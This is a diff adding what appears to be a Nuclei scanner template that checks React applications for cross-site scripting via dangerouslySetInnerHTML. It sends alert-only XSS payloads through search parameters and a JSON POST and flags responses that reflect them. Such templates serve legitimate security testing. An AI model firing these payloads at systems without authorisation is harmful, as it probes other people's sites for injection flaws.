@@ -1,0 +1,63 @@
+id: react-dangerouslySetInnerHTML-xss
+
+info:
+  name: React dangerouslySetInnerHTML XSS Vector Detection
+  author: pt-zenity
+  severity: high
+  description: |
+    React application is using dangerouslySetInnerHTML which may be vulnerable
+    to Cross-Site Scripting if user-controlled data is not sanitized before
+    being passed to the component. This template tests common injection points.
+  reference:
+    - https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml
+  classification:
+    cwe-id: CWE-79
+  tags: react,xss,injection,high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q={{url_encode('<script>alert(1)</script>')}}"
+      - "{{BaseURL}}/search?q={{url_encode('<img src=x onerror=alert(1)>')}}"
+      - "{{BaseURL}}?q={{url_encode('<script>alert(document.domain)</script>')}}"
+      - "{{BaseURL}}?search={{url_encode('<svg onload=alert(1)>')}}"
+      - "{{BaseURL}}?name={{url_encode('\">')}}"
+
+    stop-at-first-match: false
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - "contains(body, '<script>') && contains(tolower(header), 'text/html')"
+
+  - raw:
+      - |
+        POST /api/search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"query":"<script>alert('xss')</script>","q":"<img src=x onerror=alert(1)>"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<script>alert"
+          - "onerror=alert"
+          - "<svg onload"
+        condition: or
